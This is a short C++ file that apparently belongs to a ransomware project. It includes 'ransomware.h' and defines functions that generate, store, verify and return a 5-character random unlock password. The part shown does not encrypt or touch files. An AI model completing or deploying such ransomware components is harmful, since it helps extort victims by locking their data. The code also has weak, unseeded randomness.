#include "ransomware.h"
#include <iostream>
#include <cstdlib>
#include <ctime>
using namespace std;

// Stores the generated password globally within this file
static string GeneratedPassword = "";

string GenerateRandomPassword() {
    const string charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    const int length = 5;
    string password = "";

    for (int i = 0; i < length; ++i) {
        int index = rand() % charset.length();
        password += charset[index];
    }

    GeneratedPassword = password;  // Store it for later verification
    return password;
}

bool VerifyPassword(const string& password) {
    return password == GeneratedPassword;  // Compare with the correct password
}

string GetGeneratedPassword() {
    return GeneratedPassword;
}
